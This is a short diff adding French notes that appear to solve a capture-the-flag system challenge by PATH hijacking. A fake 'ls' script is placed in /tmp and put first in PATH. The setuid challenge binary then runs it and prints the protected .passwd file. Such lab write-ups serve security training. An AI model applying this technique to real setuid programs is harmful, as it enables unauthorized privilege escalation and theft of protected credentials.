@@ -1,0 +1,14 @@
+mkdir /tmp/bcrespin
+vim /tmp/bcrespin/ls
+
+ecriture d'un script shell
+#!/bin/sh
+cat /challenge/app-systeme/ch2/.passwd
+
+je lui donne les droits d'execution
+chmod 4755 /tmp/bcrespin/ls
+
+et je rajoute le path au debut du PATH
+PATH=/tmp/bcrespin:$PATH
+
+puis execution ./ch2
